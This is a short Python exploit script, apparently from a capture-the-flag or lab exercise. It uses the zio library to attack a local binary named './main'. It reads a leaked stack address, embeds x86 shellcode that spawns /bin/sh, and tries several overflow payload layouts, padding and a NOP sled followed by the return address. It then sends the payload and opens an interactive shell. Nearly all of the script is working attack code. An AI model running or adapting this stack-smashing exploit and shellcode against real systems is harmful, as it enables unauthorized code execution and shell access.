#!/usr/bin/env python

from zio import *
import binascii

def junk(size):
    result = ""
    for i in range(size):
        result += chr(ord("A") + i) * 4
    return result

def main():
    Io = zio("./main")
    #address = l32(int(Io.readline().replace("Address : 0x", ""), 16) + 32)
    address = l32(int(Io.readline().replace("Address : 0x", ""), 16))
    print binascii.b2a_hex(address)
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
    #shellcode = "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"
    print len(shellcode)
    junk = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
    print len(junk)
    #payload = shellcode + "A" * (len(junk) - len(shellcode)) + address
    payload = junk + address
    payload = shellcode + "AAAAA" + address
    payload = junk + address + shellcode
    payload = "\x90" * 3 + shellcode + address
    with open("./payload", "w") as f:
        f.write(payload)
    Io.write(payload)
    Io.interact()

if __name__ == "__main__":
    main()


